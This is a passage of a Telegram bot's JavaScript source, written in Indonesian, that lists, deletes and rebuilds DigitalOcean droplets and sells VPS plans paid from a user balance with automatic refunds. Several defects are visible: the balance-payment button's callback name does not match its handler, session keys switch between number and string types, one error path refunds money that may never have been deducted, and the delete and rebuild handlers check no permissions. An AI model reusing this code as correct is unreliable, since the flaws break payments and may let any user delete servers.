      `📊 <b>Status Akun:</b> ${status}\n\n` +  
      `🔢 <b>Limit Maksimal Droplet:</b> ${limit}\n` +  
      `💎 <b>Sisa Droplet Tersedia:</b> ${remain}\n` +  
      `🚀 <b>Total Droplet Terpakai:</b> ${used}</blockquote>`,  
      { parse_mode: "HTML" }  
    );  

  } catch (err) {  
    console.log(err);  
    return ctx.editMessageText(  
      `<blockquote>❌ <b>Error mengambil data Akun V${version}</b></blockquote>`,  
      { parse_mode: "HTML" }  
    );  
  }
});

// Callback: List Droplets
bot.action(/^ld_check:(.+)$/, async (ctx) => {
  const version = ctx.match[1];  
  const apiKey = apiDigitalOcean[`akun${version}`];  

  if (!apiKey || apiKey.length < 64) {  
    return ctx.answerCbQuery("❌ API Key tidak valid!", { show_alert: true });  
  }  

  await ctx.answerCbQuery();  

  try {  
    const result = await doApiRequest(apiKey, '/droplets');

    if (!result.success) {  
      return ctx.editMessageText(  
        `<blockquote>❌ <b>Gagal mengambil data droplet Akun V${version}</b></blockquote>`,  
        { parse_mode: "HTML" }  
      );  
    }  

    const dataDroplet = result.data;  
    const droplets = dataDroplet.droplets || [];  

    let text = `<blockquote>🌐 <b>LIST DROPLET DIGITALOCEAN</b>\n`;  
    text += `🌟 <b>Akun V${version}</b>\n`;  
    text += `📦 Total Droplet: <b>${droplets.length}</b>\n\n`;  

    if (droplets.length === 0) {  
      text += `🚫 Tidak ada droplet ditemukan.`;  
    } else {  
      droplets.forEach((d, idx) => {  
        const ip = d.networks.v4.find(net => net.type === "public")?.ip_address || "No IP";  
        text += `🔹 <b>Droplet ${idx + 1}</b>\n`;  
        text += `ID: ${d.id}\n`;  
        text += `Hostname: ${d.name}\n`;  
        text += `IP: ${ip}\n`;  
        text += `RAM: ${d.memory} MB\n`;  
        text += `CPU: ${d.vcpus} vCPU\n`;  
        text += `Disk: ${d.disk} GB\n`;  
        text += `OS: ${d.image.distribution} ${d.image.name || ''}\n`;  
        text += `Status: ${d.status}\n\n`;  
      });  
    }  
    text += `</blockquote>`;  

    return ctx.editMessageText(text, { parse_mode: "HTML" });  

  } catch (e) {  
    console.log(e);  
    return ctx.editMessageText(  
      `<blockquote>❌ <b>Terjadi kesalahan saat mengambil data!</b></blockquote>`,  
      { parse_mode: "HTML" }  
    );  
  }
});

// Callback: Konfirmasi Delete Vps
bot.action("delvps_no", async (ctx) => {
  await ctx.answerCbQuery("Dibatalkan.", { show_alert: false });  
  return ctx.editMessageText("<blockquote>❌ <b>Penghapusan dibatalkan.</b></blockquote>", { parse_mode: "HTML" });  
});

bot.action(/^delvps_yes:(.+):(.+)$/, async (ctx) => {
  const akun = ctx.match[1];
  const dropletId = ctx.match[2];
  const apiKey = apiDigitalOcean[`akun${akun}`];  

  await ctx.answerCbQuery("Menghapus VPS...", { show_alert: false });  

  try {  
    const delResult = await doApiRequest(apiKey, `/droplets/${dropletId}`, 'DELETE');

    if (delResult.success) {  
      return ctx.editMessageText(  
        `<blockquote>✅ <b>Droplet berhasil dihapus!</b>\n\n🆔 ID: <b>${dropletId}</b>\n🌍 Akun: <b>V${akun}</b></blockquote>`,  
        { parse_mode: "HTML" }  
      );  
    } else {  
      return ctx.editMessageText(  
        `<blockquote>❌ Gagal menghapus VPS:\n${delResult.error || "Unknown error"}</blockquote>`,  
        { parse_mode: "HTML" }  
      );  
    }  
  } catch (e) {  
    return ctx.reply("<blockquote>❌ Error memproses penghapusan VPS.</blockquote>", { parse_mode: "HTML" });  
  }
});

// Callback: Rebuild Vps
bot.action(/^rb_select:(.+):(.+)$/, async (ctx) => {
  const dropletId = ctx.match[1];
  const version = ctx.match[2];
  
  const userId = ctx.from.id.toString();
  doSession.delete(userId);

  const apiKey = apiDigitalOcean[`akun${version}`];  
  if (!apiKey || apiKey.length < 64)  
    return ctx.answerCbQuery("API Key invalid!", { show_alert: true });  

  const osList = [  
    { name: "Ubuntu 20.04", slug: "ubuntu-20-04-x64" },  
    { name: "Ubuntu 22.04", slug: "ubuntu-22-04-x64" },  
    { name: "Ubuntu 24.04", slug: "ubuntu-24-04-x64" },  
    { name: "Ubuntu 25.04", slug: "ubuntu-25-04-x64" },  
    { name: "Ubuntu 25.10", slug: "ubuntu-25-10-x64" },  
    { name: "Fedora 42", slug: "fedora-42-x64" },  
    { name: "Debian 12", slug: "debian-12-x64" },  
    { name: "Debian 13", slug: "debian-13-x64" },  
    { name: "CentOS Stream 9", slug: "centos-stream-9-x64" },  
    { name: "CentOS Stream 10", slug: "centos-stream-10-x64" },  
    { name: "AlmaLinux 8", slug: "almalinux-8-x64" },  
    { name: "AlmaLinux 9", slug: "almalinux-9-x64" },  
    { name: "AlmaLinux 10", slug: "almalinux-10-x64" },  
    { name: "Rocky Linux 8", slug: "rockylinux-8-x64" },  
    { name: "Rocky Linux 9", slug: "rockylinux-9-x64" },  
    { name: "Rocky Linux 10", slug: "rockylinux-10-x64" }  
  ];  

  const keyboard = osList.map(os => [  
    Markup.button.callback(os.name, `rb_os:${dropletId}:${version}:${os.slug}`)
  ]);  

  return ctx.editMessageText(
    `<blockquote>🔧 <b>Pilih OS untuk Rebuild</b>\n\n` +
    `🆔 Droplet ID: <b>${dropletId}</b>\n` +
    `🌍 Akun DO: <b>V${version}</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    }
  );  
});

// Callback: Proses Rebuild
bot.action(/^rb_os:(.+):(.+):(.+)$/, async (ctx) => {
  const dropletId = ctx.match[1];
  const version = ctx.match[2];
  const osSlug = ctx.match[3];
  const apiKey = apiDigitalOcean[`akun${version}`];

  await ctx.answerCbQuery();  

  await ctx.deleteMessage().catch(() => {});  

  const frames = [  
    "🔄 <b>Rebuild sedang diproses...</b>\n\n⏳ Mohon tunggu...",  
    "🔄 <b>Rebuild sedang diproses...</b>\n\n⌛ Mohon tunggu...",  
    "🔄 <b>Rebuild sedang diproses...</b>\n\n🌀 Mohon tunggu...",  
    "🔄 <b>Rebuild sedang diproses...</b>\n\n💿 Mohon tunggu..."  
  ];  

  const loading = await animateLoading(ctx, frames, 600);  

  try {
    const imgResult = await doApiRequest(apiKey, '/images?type=distribution');
    
    if (!imgResult.success) {
      clearInterval(loading.interval);
      await ctx.deleteMessage(loading.message_id).catch(() => {});
      return ctx.reply(`<blockquote>❌ Gagal mengambil daftar image!</blockquote>`, { parse_mode: "HTML" });
    }

    const img = imgResult.data;
    const target = img.images.find(i => i.slug === osSlug);  

    if (!target) {  
      clearInterval(loading.interval);  
      await ctx.deleteMessage(loading.message_id).catch(() => {});  
      return ctx.reply(`<blockquote>❌ Image slug <b>${osSlug}</b> tidak ditemukan!</blockquote>`, { parse_mode: "HTML" });  
    }  

    const imageID = target.id;  

    const rebuildResult = await doApiRequest(
      apiKey, 
      `/droplets/${dropletId}/actions`, 
      'POST', 
      {
        type: "rebuild",
        image: imageID
      }
    );  

    if (!rebuildResult.success) {
      clearInterval(loading.interval);
      await ctx.deleteMessage(loading.message_id).catch(() => {});
      return ctx.reply(`<blockquote>❌ Gagal rebuild: ${rebuildResult.error}</blockquote>`, { parse_mode: "HTML" });
    }

    const res = rebuildResult.data;

    await ctx.telegram.editMessageText(  
      ctx.chat.id,  
      loading.message_id,  
      null,  
      `<blockquote>🔄 <b>Rebuild dimulai!</b>\n\n🆔 ID: <code>${dropletId}</code>\n🌀 API: V${version}\n💿 OS: <b>${osSlug}</b>\n⚙️ Status: ${res.action.status}</blockquote>`,  
      { parse_mode: "HTML" }  
    );  

    clearInterval(loading.interval);
    
    setTimeout(async () => {  
      const infoResult = await doApiRequest(apiKey, `/droplets/${dropletId}`);
      
      if (infoResult.success) {
        const vps = infoResult.data;  
        const droplet = vps.droplet;  

        const ip = droplet.networks.v4.find(n => n.type === "public")?.ip_address || "IP belum muncul";  

        await ctx.deleteMessage(loading.message_id).catch(() => {});  
        return ctx.reply(  
          `<blockquote>🎉 <b>Rebuild Selesai!</b>\n\n🆔 ID: <code>${dropletId}</code>\n🌐 IP: <code>${ip}</code>\n💿 OS: <b>${droplet.image.distribution} ${droplet.image.name || ''}</b></blockquote>`,  
          { parse_mode: "HTML" }  
        );  
      } else {
        await ctx.deleteMessage(loading.message_id).catch(() => {});
        return ctx.reply(
          `<blockquote>✅ <b>Rebuild Selesai!</b>\n\n🆔 ID: <code>${dropletId}</code>\n🌍 Akun: V${version}\n💿 OS: <b>${osSlug}</b></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    }, 60000);
  } catch (error) {
    clearInterval(loading.interval);
    await ctx.deleteMessage(loading.message_id).catch(() => {});
    return ctx.reply(`<blockquote>❌ Error saat rebuild: ${error.message}</blockquote>`, { parse_mode: "HTML" });
  }
});

// ---------- [ Buy Vps ] ------------ \\
bot.action("buyvps", async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }

  const statusDO = await getDropletStatus();

  if (statusDO.remain <= 0) {
    return editMenuMessage(ctx,
`<blockquote>🚫 <b>𝗦𝗧𝗢𝗞 𝗩𝗣𝗦 𝗦𝗨𝗗𝗔𝗛 𝗛𝗔𝗕𝗜𝗦!</b> 
<b>━━━━━━━━━━━━━━━━━━━━⨳</b>
📨 <b>𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗛𝘂𝗯𝘂𝗻𝗴𝗶 𝗢𝘄𝗻𝗲𝗿</b>
<b>𝗨𝗻𝘁𝘂𝗸 𝗦𝗲𝗴𝗲𝗿𝗮 𝗥𝗲𝘀𝘁𝗼𝗰𝗸 𝗩𝗣𝗦.</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "🔙 KEMBALI", callback_data: "Order" }]]
        }
      }
    );
  }

  await editMenuMessage(ctx,
`<blockquote>🛒 <b>𝗖𝗔𝗧𝗘𝗚𝗢𝗥𝗬 𝗩𝗜𝗥𝗧𝗨𝗔𝗟 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗦𝗘𝗥𝗩𝗘𝗥</b>
<b>❍━━━━━━━━━━━━━━━━━━━━━━❍</b>
🟢 <b>𝗟𝗢𝗪 𝗩𝗣𝗦</b>
▪️ 𝗚𝗮𝗿𝗮𝗻𝘀𝗶: <i>𝟭 𝗛𝗮𝗿𝗶</i>
▪️ 𝗛𝗮𝗿𝗴𝗮: <b>${toRupiah ? toRupiah(config.hargaVPS.low['2c2']) : 'Rp ' + config.hargaVPS.low['2c2'].toLocaleString('id-ID')}</b>
<b>❍━━━━━━━━━━━━━━━━━━━━━━❍</b>
🟡 <b>𝗠𝗘𝗗𝗜𝗨𝗠 𝗩𝗣𝗦</b>
▪️ 𝗚𝗮𝗿𝗮𝗻𝘀𝗶: <i>𝟮 𝗛𝗮𝗿𝗶</i>
▪️ 𝗛𝗮𝗿𝗴𝗮: <b>${toRupiah ? toRupiah(config.hargaVPS.medium['2c2']) : 'Rp ' + config.hargaVPS.medium['2c2'].toLocaleString('id-ID')}</b>
<b>❍━━━━━━━━━━━━━━━━━━━━━━❍</b>
🔴 <b>𝗛𝗜𝗚𝗛 𝗩𝗣𝗦</b>
▪️ 𝗚𝗮𝗿𝗮𝗻𝘀𝗶: <i>𝟯 𝗛𝗮𝗿𝗶</i>
▪️ 𝗛𝗮𝗿𝗴𝗮: <b>${toRupiah ? toRupiah(config.hargaVPS.high['2c2']) : 'Rp ' + config.hargaVPS.high['2c2'].toLocaleString('id-ID')}</b>
<b>❍━━━━━━━━━━━━━━━━━━━━━━❍</b>
✨ <b>𝗣𝗟𝗘𝗔𝗦𝗘 𝗦𝗘𝗟𝗘𝗖𝗧 𝗖𝗔𝗧𝗘𝗚𝗢𝗥𝗬</b>
📊 <b>Stok Tersedia: ${statusDO.remain} VPS</b></blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🟢 𝗟𝗢𝗪 𝗩𝗣𝗦", callback_data: "buyvps_pkg:low" }],
          [{ text: "🟡 𝗠𝗘𝗗𝗜𝗨𝗠 𝗩𝗣𝗦", callback_data: "buyvps_pkg:medium" }],
          [{ text: "🔴 𝗛𝗜𝗚𝗛 𝗩𝗣𝗦", callback_data: "buyvps_pkg:high" }],
          [{ text: "💰 Cek Saldo", callback_data: "CheckSaldo" }],
          [{ text: "🔙 𝗞𝗘𝗠𝗕𝗔𝗟𝗜", callback_data: "Order" }]
        ]
      }
    }
  );
});

// Quick access cek saldo dari footer menu
bot.action("CheckSaldo", async (ctx) => {
    const userId = ctx.from.id.toString();
    const saldo = getUserSaldo(userId);
    
    await ctx.answerCbQuery(`💰 Saldo Anda: Rp ${saldo.toLocaleString('id-ID')}`, {
        show_alert: true  // Muncul sebagai popup
    });
    
    // Atau tampilkan di pesan terpisah
    await ctx.reply(
        `<blockquote>💰 <b>SALDO ANDA</b></blockquote>
<blockquote>💳 Rp ${saldo.toLocaleString('id-ID')}</blockquote>
<blockquote>🔍 Ketik /ceksaldo untuk detail lengkap</blockquote>`,
        { parse_mode: "HTML" }
    );
});

bot.action(/buyvps_pkg:(low|medium|high)/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  const paket = ctx.match[1];
  const userId = ctx.from.id;
  
  const statusDO = await getDropletStatus();

  if (statusDO.remain <= 0) {
    return editMenuMessage(ctx,
`<b>❌ 𝗦𝘁𝗼𝗰𝗸 𝗧𝗲𝗹𝗮𝗵 𝗛𝗮𝗯𝗶𝘀</b>

<b>Mohon Maaf Sebesar-besarnya 🙏</b>
<b>Stok VPS kami sudah habis (Limit Tercapai) 😞</b>

<b>Silahkan hubungi ADMIN untuk meminta restock VPS.</b>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "buyvps" }]]
        }
      }
    );
  }

  // Simpan session
  if (!vpsOrderSession.has(userId)) {
    vpsOrderSession.set(userId, {});
  }
  const session = vpsOrderSession.get(userId);
  session.paket = paket;
  vpsOrderSession.set(userId, session);

  const dataHarga = config.hargaVPS[paket] || {};
  
  const listRam = [
    { id: 1, label: "2GB RAM | 2 vCPU | 60GB SSD", plan: "2c2", harga: dataHarga["2c2"] || 0 },
    { id: 2, label: "4GB RAM | 2 vCPU | 80GB SSD", plan: "4c2", harga: dataHarga["4c2"] || 0 },
    { id: 3, label: "8GB RAM | 4 vCPU | 160GB SSD", plan: "8c4", harga: dataHarga["8c4"] || 0 },
    { id: 4, label: "16GB RAM | 4 vCPU | 200GB SSD", plan: "16c4", harga: dataHarga["16c4"] || 0 },
    { id: 5, label: "16GB RAM | 8 vCPU | 320GB SSD", plan: "16c8", harga: dataHarga["16c8"] || 0 }
  ].filter(item => item.harga > 0);

  let teks = `<blockquote><b>🖥️ PILIH SPESIFIKASI VPS - ${paket.toUpperCase()}</b>\n`;
  teks += `<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n`;

  for (const item of listRam) {
    teks += `<b>[ ${item.id} ]</b> ${item.label}\n`;
    teks += `<b>╰┈➤ Rp ${item.harga.toLocaleString("id-ID")}</b>\n`;
    teks += `<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n`;
  }

  teks += `\n<b>✅ STOK TERSEDIA : ${statusDO.remain} VPS</b>\n`;
  teks += `<b>━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>`;

  const keyboard = [];
  
  // Buat tombol dalam baris (maks 3 per baris)
  for (let i = 0; i < listRam.length; i += 3) {
    const row = [];
    for (let j = i; j < i + 3 && j < listRam.length; j++) {
      row.push({ 
        text: `${listRam[j].id}`, 
        callback_data: `buyvps_ram:${listRam[j].plan}` 
      });
    }
    keyboard.push(row);
  }

  keyboard.push([{ text: "⬅️ Kembali", callback_data: "buyvps" }]);

  await editMenuMessage(ctx, teks, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  });
});

// Pilih RAM/Plan
bot.action(/buyvps_ram:(.+)/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  const plan = ctx.match[1];
  const userId = ctx.from.id;
  
  const session = vpsOrderSession.get(userId);
  if (!session || !session.paket) {
    return ctx.answerCbQuery("❌ Session expired, mulai lagi", { show_alert: true });
  }

  session.plan = plan;
  vpsOrderSession.set(userId, session);

  const harga = config.hargaVPS[session.paket][plan];

  const osList = [
    { name: "Ubuntu 20.04", slug: "ubuntu-20-04-x64" },
    { name: "Ubuntu 22.04", slug: "ubuntu-22-04-x64" },
    { name: "Ubuntu 24.04", slug: "ubuntu-24-04-x64" },
    { name: "Debian 12", slug: "debian-12-x64" },
    { name: "CentOS Stream 9", slug: "centos-stream-9-x64" },
    { name: "AlmaLinux 9", slug: "almalinux-9-x64" }
  ];

  const keyboard = osList.map(os => [
    { text: os.name, callback_data: `buyvps_os:${os.slug}` }
  ]);

  keyboard.push([{ text: "⬅️ Kembali", callback_data: `buyvps_pkg:${session.paket}` }]);

  await editMenuMessage(ctx,
`<blockquote>💿 <b>PILIH OPERATING SYSTEM</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
📦 Paket: <b>${session.paket.toUpperCase()}</b>
🖥️ Plan: <b>${plan}</b>
💰 Harga: <b>Rp ${harga.toLocaleString("id-ID")}</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
Silakan pilih OS yang diinginkan:</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    }
  );
});

// Pilih OS
bot.action(/buyvps_os:(.+)/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  const os = ctx.match[1];
  const userId = ctx.from.id;
  
  const session = vpsOrderSession.get(userId);
  if (!session || !session.paket || !session.plan) {
    return ctx.answerCbQuery("❌ Session expired, mulai lagi", { show_alert: true });
  }

  session.os = os;
  vpsOrderSession.set(userId, session);

  const harga = config.hargaVPS[session.paket][session.plan];

  const regions = [
    ["🇸🇬 Singapore", "sgp1"],
    ["🇺🇸 New York", "nyc3"],
    ["🇺🇸 San Francisco", "sfo3"],
    ["🇳🇱 Amsterdam", "ams3"],
    ["🇬🇧 London", "lon1"],
    ["🇩🇪 Frankfurt", "fra1"],
    ["🇨🇦 Toronto", "tor1"]
  ];

  const keyboard = regions.map(r => [
    { text: r[0], callback_data: `buyvps_region:${r[1]}` }
  ]);

  keyboard.push([{ text: "⬅️ Kembali", callback_data: `buyvps_ram:${session.plan}` }]);

  await editMenuMessage(ctx,
`<blockquote>🌍 <b>PILIH REGION VPS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
📦 Paket: <b>${session.paket.toUpperCase()}</b>
🖥️ Plan: <b>${session.plan}</b>
💿 OS: <b>${os}</b>
💰 Harga: <b>Rp ${harga.toLocaleString("id-ID")}</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>
Silakan pilih region:</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: { inline_keyboard: keyboard }
    }
  );
});

// Pilih Region dan Konfirmasi
bot.action(/buyvps_region:(.+)/, async (ctx) => {
  if (ctx.chat.type !== "private") {
    return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
  }
  
  const region = ctx.match[1];
  const userId = ctx.from.id;
  
  const session = vpsOrderSession.get(userId);
  if (!session || !session.paket || !session.plan || !session.os) {
    return ctx.answerCbQuery("❌ Session expired, mulai lagi", { show_alert: true });
  }

  session.region = region;
  vpsOrderSession.set(userId, session);

  const harga = config.hargaVPS[session.paket][session.plan];

  const regionNames = {
    "sgp1": "🇸🇬 Singapore",
    "nyc3": "🇺🇸 New York",
    "sfo3": "🇺🇸 San Francisco",
    "ams3": "🇳🇱 Amsterdam",
    "lon1": "🇬🇧 London",
    "fra1": "🇩🇪 Frankfurt",
    "tor1": "🇨🇦 Toronto"
  };

  await editMenuMessage(ctx,
`<blockquote>🛒 <b>KONFIRMASI PEMBELIAN VPS</b>
📦 Paket: <b>${session.paket.toUpperCase()}</b>
🖥️ Spesifikasi: <b>${session.plan}</b>
💿 OS: <b>${session.os}</b>
🌍 Region: <b>${regionNames[region] || region}</b>
💰 Harga: <b>Rp ${harga.toLocaleString("id-ID")}</b>

Apakah Anda ingin melanjutkan pembayaran?</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Bayar Via Qris", callback_data: `buyvps_pay_qris` },
            { text: "Bayar Via Saldo", callback_data: `buyvps_pay_saldp` },
            { text: "❌ Batal", callback_data: "buyvps" }
          ]
        ]
      }
    }
  );
});

// Proses Pembayaran
// ---------- [ Buy Vps dengan Saldo ] ------------
bot.action("buyvps_pay_saldo", async (ctx) => {
    if (ctx.chat.type !== "private") {
        return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
    }
    
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;
    const username = ctx.from.username || ctx.from.first_name;
    
    const session = vpsOrderSession.get(userId);
    if (!session || !session.paket || !session.plan || !session.os || !session.region) {
        return ctx.answerCbQuery("❌ Data tidak lengkap, mulai lagi", { show_alert: true });
    }

    // CEK STOK REAL-TIME
    const statusDO = await getDropletStatus();
    if (statusDO.remain <= 0) {
        return editMenuMessage(ctx,
`<b>❌ 𝗦𝘁𝗼𝗰𝗸 𝗧𝗲𝗹𝗮𝗵 𝗛𝗮𝗯𝗶𝘀</b>

Maaf, stok VPS habis saat Anda memproses pesanan.`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "buyvps" }]]
                }
            }
        );
    }

    const harga = config.hargaVPS[session.paket][session.plan];
    const orderId = `VPS${Date.now()}${userId}`;

    session.orderId = orderId;
    session.price = harga;
    vpsOrderSession.set(userId, session);

    try {
        await editMenuMessage(ctx, "<blockquote>⏳ Memproses pembayaran dengan saldo...</blockquote>", { parse_mode: "HTML" });

        // CEK SALDO USER
        const userSaldo = getUserSaldo(userId);

        if (userSaldo < harga) {
            return editMenuMessage(ctx,
`<blockquote>❌ <b>SALDO TIDAK MENCUKUPI</b>

💰 Total: <b>Rp ${harga.toLocaleString("id-ID")}</b>
💳 Saldo Anda: <b>Rp ${userSaldo.toLocaleString("id-ID")}</b>
💸 Kekurangan: <b>Rp ${(harga - userSaldo).toLocaleString("id-ID")}</b>

Silahkan isi saldo terlebih dahulu.</blockquote>`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "💰 Hubungi Owner", url: "https://t.me/ReyValdz" }],
                            [{ text: "🔙 Kembali", callback_data: "buyvps" }]
                        ]
                    }
                }
            );
        }

        // POTONG SALDO
        const deductSuccess = deductUserSaldo(userId, harga);
        if (!deductSuccess) {
            throw new Error("Gagal memotong saldo");
        }
        
        const sisaSaldo = getUserSaldo(userId);

        // UPDATE PESAN BAHWA PEMBAYARAN BERHASIL
        await editMenuMessage(ctx,
`<blockquote>✅ <b>PEMBAYARAN BERHASIL!</b>

💰 Total: <b>Rp ${harga.toLocaleString("id-ID")}</b>
💳 Sisa Saldo: <b>Rp ${sisaSaldo.toLocaleString("id-ID")}</b>

⏳ Sedang membuat VPS Anda...</blockquote>`,
            { parse_mode: "HTML" }
        );

        // ---> AUTO REFUND LOGIC START <---
        let vpsCreationSuccess = false;
        let vpsResult = null;
        
        try {
            // BUAT VPS
            vpsResult = await CreateBuyVps({
                userId,
                username: username,
                paket: session.paket,
                plan: session.plan,
                os: session.os,
                region: session.region,
                price: harga,
                orderId
            });

            if (vpsResult && vpsResult.success) {
                vpsCreationSuccess = true;
                
                const regionNames = {
                    "sgp1": "🇸🇬 Singapore",
                    "nyc3": "🇺🇸 New York",
                    "sfo3": "🇺🇸 San Francisco",
                    "ams3": "🇳🇱 Amsterdam",
                    "lon1": "🇬🇧 London",
                    "fra1": "🇩🇪 Frankfurt",
                    "tor1": "🇨🇦 Toronto"
                };

                // Hapus pesan QRIS jika ada
                if (session.qrisMessageId && session.qrisChatId) {
                    await ctx.telegram.deleteMessage(session.qrisChatId, session.qrisMessageId).catch(() => {});
                }

                await editMenuMessage(ctx,
`<blockquote>✅ <b>VPS BERHASIL DIBUAT!</b>

📦 Paket: <b>${session.paket.toUpperCase()}</b>
🖥️ Spesifikasi: <b>${session.plan}</b>
🌎 Region: <b>${regionNames[session.region] || session.region}</b>
💿 OS: <b>${session.os}</b>
💰 Total: <b>Rp ${harga.toLocaleString("id-ID")}</b>
🆔 Order ID: <b>${orderId}</b>
💳 Sisa Saldo: <b>Rp ${getUserSaldo(userId).toLocaleString("id-ID")}</b>

📌 <b>INFORMASI PENTING</b>
━━━━━━━━━━━━━━━━━━━━━━
• Data login VPS telah dikirim ke chat pribadi Anda
• Cek chat pribadi dengan bot ini untuk detail VPS
• Jika ada masalah, silakan hubungi admin @ReyValdz</blockquote>`,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [[{ text: "🛒 Beli Lagi", callback_data: "buyvps" }]]
                        }
                    }
                );

                // KIRIM NOTIFIKASI KE OWNER (SUKSES)
                await ctx.telegram.sendMessage(
                    config.owner,
`<blockquote>💰 <b>PEMBAYARAN VPS (SALDO) BERHASIL</b>
👤 User: ${username} (ID: ${userId})
📦 Paket: ${session.paket.toUpperCase()} - ${session.plan}
🌎 Region: ${session.region}
💿 OS: ${session.os}
💵 Nominal: Rp${harga.toLocaleString("id-ID")}
💳 Sisa Saldo: Rp${getUserSaldo(userId).toLocaleString("id-ID")}
🆔 Order ID: ${orderId}</blockquote>`,
                    { parse_mode: "HTML" }
                );

                // KIRIM TESTIMONI KE CHANNEL
                await sendTesti("vps", {
                    userId,
                    username,
                    paket: session.paket,
                    plan: session.plan,
                    amount: harga,
                    orderId
                }).catch(() => {});

            } else {
                // Jika CreateBuyVps mengembalikan { success: false, error: "..." }
                throw new Error(vpsResult?.error || "Gagal membuat VPS dari provider.");
            }
            
        } catch (error) {
            // ---> AUTO REFUND: KEMBALIKAN SALDO <---
            console.error("❌ Error saat membuat VPS:", error.message);

            // 1. Kembalikan saldo (REFUND)
            const saldoSetelahRefund = updateUserSaldo(userId, harga);
            
            // 2. Hapus pesan QRIS jika ada
            if (session.qrisMessageId && session.qrisChatId) {
                await ctx.telegram.deleteMessage(session.qrisChatId, session.qrisMessageId).catch(() => {});
            }

            // 3. Beri tahu user bahwa saldo dikembalikan
            await editMenuMessage(ctx,
`<blockquote>⚠️ <b>TRANSAKSI GAGAL - SALDO DIREFUND</b>

Pembayaran Anda sebesar <b>Rp ${harga.toLocaleString("id-ID")}</b> telah kami terima,
namun terjadi kesalahan teknis saat membuat VPS Anda.

✅ <b>SALDO ANDA TELAH DIREFUND OTOMATIS</b>
💳 Saldo Anda sekarang: <b>Rp ${saldoSetelahRefund.toLocaleString("id-ID")}</b>

🆔 Order ID: ${orderId}
📋 Error: ${error.message}

Tim teknis kami akan menyelidiki masalah ini.
Silakan coba lagi nanti atau hubungi admin @ReyValdz.</blockquote>`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔄 Coba Lagi", callback_data: "buyvps" }],
                            [{ text: "👤 Hubungi Admin", url: "https://t.me/ReyValdz" }]
                        ]
                    }
                }
            );

            // 4. Kirim notifikasi ke owner (GAGAL + SUDAH DIREFUND)
            await ctx.telegram.sendMessage(
                config.owner,
`<blockquote>🚨 <b>PEMBAYARAN VPS GAGAL - DANA SUDAH DIREFUND OTOMATIS</b>
👤 User: ${username} (ID: ${userId})
📦 Paket: ${session.paket.toUpperCase()} - ${session.plan}
💵 Nominal: Rp${harga.toLocaleString("id-ID")}
🆔 Order ID: ${orderId}
❌ Error: ${error.message}

✅ Status: <b>DANA SUDAH DIREFUND KE USER</b></blockquote>`,
                { parse_mode: "HTML" }
            );
            
        } finally {
            // 5. Hapus session jika berhasil, jika gagal biarkan session untuk "Coba Lagi"
            if (vpsCreationSuccess) {
                vpsOrderSession.delete(userId);
            }
        }
        // ---> AUTO REFUND LOGIC END <---

    } catch (err) {
        console.error("❌ Fatal error in buyvps_pay_saldo:", err);
        
        // Pastikan refund jika ada error di luar blok try
        const currentSaldo = getUserSaldo(userId);
        updateUserSaldo(userId, harga);
        const newSaldo = getUserSaldo(userId);
        
        await editMenuMessage(ctx,
`<blockquote>❌ <b>TERJADI KESALAHAN SISTEM</b>

Maaf, terjadi kesalahan pada sistem kami.
Saldo Anda sebesar <b>Rp ${harga.toLocaleString("id-ID")}</b> telah dikembalikan.

💳 Saldo Anda sekarang: <b>Rp ${newSaldo.toLocaleString("id-ID")}</b>

Silakan coba lagi atau hubungi admin @ReyValdz.</blockquote>`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "🔄 Coba Lagi", callback_data: "buyvps" }]]
                }
            }
        );
        
        vpsOrderSession.delete(userId);
    }
});

// ---------- [ Buy Vps dengan QRIS - AUTO NOTIF REFUND ] ------------
bot.action("buyvps_pay_qris", async (ctx) => {
    if (ctx.chat.type !== "private") {
        return ctx.answerCbQuery("❌ Harus di private chat!", { show_alert: true });
    }
    
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id;
    const username = ctx.from.username || ctx.from.first_name;
    
    const session = vpsOrderSession.get(userId);
    if (!session || !session.paket || !session.plan || !session.os || !session.region) {
        return ctx.answerCbQuery("❌ Data tidak lengkap, mulai lagi", { show_alert: true });
    }

    const statusDO = await getDropletStatus();
    if (statusDO.remain <= 0) {
        return editMenuMessage(ctx,
